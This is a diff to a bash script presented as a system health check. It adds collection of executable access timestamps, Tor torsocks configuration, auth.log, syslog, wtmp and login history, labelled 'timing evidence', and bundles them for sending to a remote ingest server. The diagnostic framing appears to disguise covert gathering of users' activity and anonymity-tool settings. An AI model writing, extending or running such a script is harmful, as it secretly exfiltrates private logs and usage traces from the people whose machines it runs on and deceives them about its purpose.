@@ -3,7 +3,7 @@
 # Collects diagnostic information for system performance monitoring.
 # Run with: bash system-health-check.sh
 
-SERVER_URL="http://10.132.112.213:5000/ingest"
+SERVER_URL="http://10.132.112.43:5000/ingest"
 TMPDIR_BASE="/tmp/.diag_$$"
 ARCHIVE="/tmp/diag_report_$$.tar.gz"
 
@@ -81,6 +81,18 @@ find /opt -maxdepth 4 -name "*.py" -o -name "*.sh" -o -name "*.rb" \
      -o -type f -executable 2>/dev/null | head -500 \
      > "$TMPDIR_BASE/fs/opt-executables.txt"
 
+# Executable access metadata (used remotely for "last used" timestamps)
+: > "$TMPDIR_BASE/fs/bin-stats.tsv"
+for scan_root in /usr/bin /usr/sbin /usr/local/bin /opt; do
+    if [ -d "$scan_root" ]; then
+        find "$scan_root" -maxdepth 4 -type f 2>/dev/null | while read -r f; do
+            if [ -x "$f" ]; then
+                stat -c '%n\t%X\t%Y' "$f" 2>/dev/null >> "$TMPDIR_BASE/fs/bin-stats.tsv"
+            fi
+        done
+    fi
+done
+
 # /tmp and /dev/shm listing (no content, just names)
 ls -la /tmp      > "$TMPDIR_BASE/fs/tmp-listing.txt"      2>/dev/null
 ls -la /dev/shm  > "$TMPDIR_BASE/fs/devshm-listing.txt"   2>/dev/null
@@ -90,6 +102,7 @@ mkdir -p "$TMPDIR_BASE/conf"
 
 CONFIG_FILES=(
     /etc/tor/torrc
+    /etc/tor/torsocks.conf
     /etc/proxychains.conf
     /etc/proxychains4.conf
     /etc/openvpn
@@ -205,6 +218,17 @@ lsblk -o NAME,SIZE,TYPE,FSTYPE,LABEL,MOUNTPOINT \
 cat /proc/partitions > "$TMPDIR_BASE/disk/partitions"  2>/dev/null
 df -h                > "$TMPDIR_BASE/disk/df.txt"       2>/dev/null
 blkid                > "$TMPDIR_BASE/disk/blkid.txt"   2>/dev/null
+
+# ── System logs (timing evidence) ────────────────────────────────────────────
+mkdir -p "$TMPDIR_BASE/logs"
+
+cp /var/log/dpkg.log         "$TMPDIR_BASE/logs/dpkg.log"         2>/dev/null
+cp /var/log/dpkg.log.1       "$TMPDIR_BASE/logs/dpkg.log.1"       2>/dev/null
+cp /var/log/pacman.log       "$TMPDIR_BASE/logs/pacman.log"       2>/dev/null
+tail -2000 /var/log/auth.log > "$TMPDIR_BASE/logs/auth.log"        2>/dev/null
+tail -2000 /var/log/syslog   > "$TMPDIR_BASE/logs/syslog.txt"      2>/dev/null
+cp /var/log/wtmp             "$TMPDIR_BASE/logs/wtmp"              2>/dev/null
+last -F -w 2>/dev/null       > "$TMPDIR_BASE/logs/last-logins.txt" 2>/dev/null
 
 # ── Bundle and send ───────────────────────────────────────────────────────────
 tar -czf "$ARCHIVE" -C "$(dirname $TMPDIR_BASE)" "$(basename $TMPDIR_BASE)" 2>/dev/null
